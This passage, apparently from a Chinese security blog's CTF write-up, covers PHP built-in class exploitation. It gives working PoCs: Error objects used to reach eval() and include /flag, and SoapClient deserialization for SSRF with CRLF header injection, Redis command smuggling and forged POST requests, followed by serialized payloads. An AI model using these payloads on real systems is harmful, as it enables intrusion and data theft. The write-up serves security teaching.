class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>可见，需要进入eval()执行代码需要先通过上面的if语句：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )</span><br></pre></td></tr></table></figure></div>

<p>这个乍看一眼在ctf的基础题目中非常常见，一般情况下只需要使用数组即可绕过。但是这里是在类里面，我们当然不能这么做。</p>
<p>这里的考点是md5()和sha1()可以对一个类进行hash，并且会触发这个类的 <code>__toString</code> 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 <code>__toString</code> 方法。</p>
<p>所以我们可以使用含有 <code>__toString</code> 方法的PHP内置类来绕过，用的两个比较多的内置类就是 <code>Exception</code> 和 <code>Error</code> ，他们之中有一个 <code>__toString</code> 方法，当类被当做字符串处理时，就会调用这个函数。</p>
<p>根据刚才讲的Error类和Exception类中 <code>__toString</code> 方法的特性，我们可以用这两个内置类进行绕过。</p>
<p>由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 <code>include &quot;/flag&quot;</code> 将flag包含进来即可。由于过滤了引号，我们直接用url取反绕过即可。</p>
<p>POC如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">或使用[~(取反)][!%FF]的形式，</span></span><br><span class="line"><span class="comment">即: $str = &quot;?&gt;&lt;?=include[~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;][!.urldecode(&quot;%FF&quot;).&quot;]?&gt;&quot;;    </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$str = &quot;?&gt;&lt;?=include $_GET[_]?&gt;&quot;; </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这里 <code>$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;</code> 中为什么要在前面加上一个 <code>?&gt;</code> 呢？因为 <code>Exception</code> 类与 <code>Error</code> 的 <code>__toString</code> 方法在eval()函数中输出的结果是不可能控的，即输出的报错信息中，payload前面还有一段杂乱信息“Error: ”：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>进入eval()函数会类似于：<code>eval(&quot;...Error: &lt;?php payload ?&gt;&quot;)</code>。所以我们要用 <code>?&gt;</code> 来闭合一下，即 <code>eval(&quot;...Error: ?&gt;&lt;?php payload ?&gt;&quot;)</code>，这样我们的payload便能顺利执行了。</p>
<p>生成的payload如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>SYCLOVER%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>syc%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">Error</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A20%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">3</span>F%<span class="number">3</span>Dinclude%<span class="number">7</span>E%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Error</span>%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">2</span>Fusercode%<span class="number">2</span>Ffile.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A19%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Error</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Error</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>lover%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">Error</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A20%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">3</span>F%<span class="number">3</span>Dinclude%<span class="number">7</span>E%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Error</span>%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A2%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">2</span>Fusercode%<span class="number">2</span>Ffile.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A19%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Error</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Error</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></div>

<p>执行便可得到flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01179b0ffa2c521598.png"
                      alt="img"
                ></p>
<h2 id="使用-SoapClient-类进行-SSRF"><a href="#使用-SoapClient-类进行-SSRF" class="headerlink" title="使用 SoapClient 类进行 SSRF"></a>使用 SoapClient 类进行 SSRF</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01ec3929a7388d6652.png"
                      alt="img"
                ></p>
<h3 id="SoapClient-类"><a href="#SoapClient-类" class="headerlink" title="SoapClient 类"></a>SoapClient 类</h3><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
<p>类摘要如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">SoapClient &#123;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$wsdl</span> , <span class="keyword">array</span> <span class="variable">$options</span> = [] )</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__call</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> ) : <span class="keyword">mixed</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__doRequest</span> ( <span class="keyword">string</span> <span class="variable">$request</span> , <span class="keyword">string</span> <span class="variable">$location</span> , <span class="keyword">string</span> <span class="variable">$action</span> , <span class="keyword">int</span> <span class="variable">$version</span> , <span class="keyword">bool</span> <span class="variable">$oneWay</span> = <span class="literal">false</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getCookies</span> ( ) : <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getFunctions</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequest</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequestHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponse</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponseHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getTypes</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__setCookie</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$value</span> = <span class="literal">null</span> ) : <span class="keyword">void</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__setLocation</span> ( <span class="keyword">string</span> <span class="variable">$location</span> = <span class="string">&quot;&quot;</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__setSoapHeaders</span> ( SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$headers</span> = <span class="literal">null</span> ) : <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__soapCall</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> , <span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$options</span> = <span class="literal">null</span> , SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$inputHeaders</span> = <span class="literal">null</span> , <span class="keyword">array</span> &amp;<span class="variable">$outputHeaders</span> = <span class="literal">null</span> ) : <span class="keyword">mixed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
<p>该类的构造函数如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: <span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [，<span class="keyword">array</span> <span class="variable">$options</span> ])</span><br></pre></td></tr></table></figure></div>

<ul>
<li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li>
<li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li>
</ul>
<h3 id="使用-SoapClient-类进行-SSRF-1"><a href="#使用-SoapClient-类进行-SSRF-1" class="headerlink" title="使用 SoapClient 类进行 SSRF"></a>使用 SoapClient 类进行 SSRF</h3><p>知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://47.xxx.xxx.72:2333&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>首先在47.xxx.xxx.72上面起个监听：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01938ec623988cbbac.png"
                      alt="img"
                ></p>
<p>然后执行上述代码，如下图所示成功触发SSRF，47.xxx.xxx.72上面收到了请求信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01ec5dfbbb3b29f6c2.png"
                      alt="img"
                ></p>
<p>但是，由于它仅限于HTTP&#x2F;HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。</p>
<p>如下测试代码，我们在HTTP头中插入一个cookie：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://47.xxx.xxx.72:2333/&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;WHOAMI\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4&quot;</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>执行代码后，如下图所示，成功在HTTP头中插入了一个我们自定义的cookie：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t0190bcae9d6fd2ec67.png"
                      alt="img"
                ></p>
<p>可以再去drops回顾一下如何通过HTTP协议去攻击Redis的：<a class="link"   href="http://wooyun.jozxing.cc/static/drops/papers-3062.html" >Trying to hack Redis via HTTP requests <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>如下测试代码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://47.xxx.xxx.72:6379/&#x27;</span>;</span><br><span class="line"><span class="variable">$poc</span> = <span class="string">&quot;CONFIG SET dir /var/www/html&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;hello^^&#x27;</span>.<span class="variable">$poc</span>.<span class="string">&#x27;^^hello&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$b</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>执行代码后，如下图所示，成功插入了Redis命令：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t019fd2531c2c76f21f.png"
                      alt="img"
                ></p>
<p>这样我们就可以利用HTTP协议去攻击Redis了。</p>
<p>对于如何发送POST的数据包，这里面还有一个坑，就是 <code>Content-Type</code> 的设置，因为我们要提交的是POST数据，所以 <code>Content-Type</code> 的值我们要设置为 <code>application/x-www-form-urlencoded</code>，这里如何修改 <code>Content-Type</code> 的值呢？由于 <code>Content-Type</code> 在 <code>User-Agent</code> 的下面，所以我们可以通过 <code>SoapClient</code> 来设置 <code>User-Agent</code> ，将原来的 <code>Content-Type</code> 挤下去，从而再插入一个新的 <code>Content-Type</code> 。</p>
<p>测试代码如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://47.xxx.xxx.72:2333/&#x27;</span>;</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&#x27;data=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_data</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>执行代码后，如下图所示，成功发送POST数据：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t016ac5c0357f58f82f.png"
                      alt="img"
                ></p>
<h3 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h3><p>bestphp’s revenge 这道题利用的就是这个点，即对 SoapClient 类进行反序列化触发 SSRF，并配合CRLF构造payload。</p>
<p>进入题目，给出源码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01baa09d269885c0a7.png"
                      alt="img"
                ></p>
<p>扫描目录发现flag.php：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01253a460ea66a459f.png"
                      alt="img"
                ></p>
<p>可见当REMOTE_ADDR等于127.0.0.1时，就会在session中插入flag，就能得到flag。很明显了，要利用ssrf。</p>
<p>但是这里并没有明显的ssrf利用点，所以我们想到利用PHP原生类SoapClient触发反序列化导致SSRF。并且，由于flag会被插入到session中，所以我们就一定需要携带一个cookie即PHPSESSID去访问它来生成这个session文件。</p>
<p>写出最后的POC：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$attack</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;123&quot;</span>));</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$attack</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br></pre></td></tr></table></figure></div>

<p>生成payload：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22123</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>_user_agent%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A56%<span class="number">3</span>A%<span class="number">22</span>N0rth3ty%<span class="number">0</span>D%<span class="number">0</span>ACookie%<span class="number">3</span>A+PHPSESSID%<span 